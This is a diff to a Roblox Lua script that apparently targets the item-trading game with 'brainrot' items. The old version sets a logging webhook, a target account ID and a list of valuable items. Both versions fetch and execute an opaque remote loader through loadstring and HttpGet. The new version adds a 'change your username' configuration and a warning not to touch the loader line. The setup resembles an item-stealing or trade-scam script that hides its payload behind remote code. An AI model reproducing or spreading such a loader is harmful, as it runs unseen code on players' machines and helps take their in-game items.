@@ -1,33 +1,9 @@
-getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_160ca4b0f8fa4469bfb9a03d26cbec9e"
-getgenv().TARGET_ID = 8843114169
-getgenv().DELAY_STEP = 1      
-getgenv().TRADE_CYCLE_DELAY = 2 
-getgenv().TARGET_BRAINROTS = {
-    ["Meowl"] = true,
-    ["Skibidi Toilet"] = true,
-    ["Strawberry Elephant"] = true,
-    ["Dragon Cannelloni"] = true,
-    ["Dragon Gingerini"] = true,
-    ["Hydra Dragon Cannelloni"] = true,
-    ["Garama and Madundung"] = true,
-    ["Festive 67"] = true,
-    ["La Romantic Grande"] = true,
-    ["Burguro And Fryuro"] = true,
-    ["Capitano Moby"] = true,
-    ["Cerberus"] = true,
-    ["Los Hotspotsitos"] = true,
-    ["Fragrama and Chocrama"] = true,
-    ["Rosey and Teddy"] = true,
-    ["La Supreme Combinasion"] = true,
-    ["Headless Horseman"] = true,
-    ["Ginger Gerat"] = true,
-    ["Love Love Bear"] = true,
-    ["Spooky and Pumpky"] = true,
-    ["La Casa Boo"] = true,
-    ["Reinito Sleighito"] = true,
-    ["Ketupat Bros"] = true,
-    ["Cooki and Milki"] = true,
-    ["Los Sekolahs"] = true,
-    ["Popcuru and Fizzuru"] = true
-}
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
+-- ============================================
+-- CONFIGURATION (CHANGE YOUR USERNAME BELOW)
+-- ============================================
+getgenv().TARGET_USERNAME = "Boytonie1" -- Mets ton pseudo Roblox ici
+
+-- ============================================
+-- DO NOT TOUCH BELOW / NE PAS TOUCHER EN BAS
+-- ============================================
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/3dfe9bec71126d4af78bf4a4ae4d9104.lua"))()
